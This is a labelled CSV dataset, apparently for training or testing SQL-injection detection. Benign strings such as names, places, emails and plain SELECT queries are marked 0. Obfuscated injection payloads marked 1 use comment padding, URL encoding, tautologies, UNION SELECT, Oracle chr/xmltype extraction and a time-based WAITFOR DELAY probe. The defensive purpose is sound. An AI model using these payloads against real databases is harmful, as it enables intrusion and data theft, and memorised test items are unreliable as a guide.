Query,Label
crabe,0
acr7m6nia,0
1%27%20%20%29%20%20%20where%202852%20%20%3D%20%202852,1
doralie,0
1'/**/	)	)	 	/*!and*/6240	 =		 (	 'qqpjq'||		(		/*!select*//*!case*/6240 /*!when*/	6240	/*!then*/ 1/*!else*/	0/*!end*/ /*!from*/rdb$/*!database*/ ) ||'qzvzq'	)		/*!and*/  (	 (	'rgyc' =	'rgyc,1
"-9638/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/oR/**/elt/**//**/(/**//**/1032/**//**/=/**//**/1032,3623/**//**/)/**//**//**/anD/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/3679/**//**/=/**//**/3679",1
foulk@eonon.com.es,0
"1""	) /*!where*/1699	=1699/*!or*/4915	=  (	/*!select*/count(* 	) /*!from*/domain.domains/*!as*/t1,domain.columns/*!as*/t2,domain.tables/*!as*/t3 	) --",1
darnall,0
"-8301')	UNIonaLl sELEcT1806,1806--",1
SELECT * FROM kids ORDER BY circle,0
rozaln del monte,0
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3,0
dulcera,0
yunquera de henares,0
"-1763%""/**/or/**//**//**/(/**//**/8459/**/LIKE/**/8459/**//**/)/**//**/*4906/**/and/**/""%""/**/LIKE/**/""",1
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
1%27%20%20%29%20%20%20or%205286%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29,1
sedran,0
"c/ gallarza, 147",0
91394289v,0
1/**//**/)/**//**//**/WhErE/**/3381/**//**/=/**//**/3381/**/anD/**/3754/**//**/=/**//**//**//**/(/**//**/sELEcT/**/upper/**//**/(/**//**/xmltype/**//**/(/**//**/chr/**//**/(/**//**/60/**//**/)/**//**/||chr/**//**/(/**//**/58/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/sELEcT/**//**//**/(/**//**/cAse/**/WHeN/**//**//**/(/**//**/3754/**//**/=/**//**/3754/**//**/)/**//**//**/THeN/**/1/**/eLSe/**/0/**/End/**//**/)/**//**//**/FrOM/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/62/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/FrOM/**/dual/**//**/)/**//**/--,1
%3B%C2%A0if%0Cnot%C2%A0%09%28%0C%0Csubstring%0B%0C%0B%28%0B%09%09%C2%A0%28%0B%09%0Cselect%0C%40%40version%C2%A0%0B%29%09%0B%2C25%2C1%0C%09%29%09%0B%C2%A0%3C%3E%090%09%C2%A0%29%0C%0C%09waitfor%0Bdelay%09%270%3A0%3A2%27%0B--,1
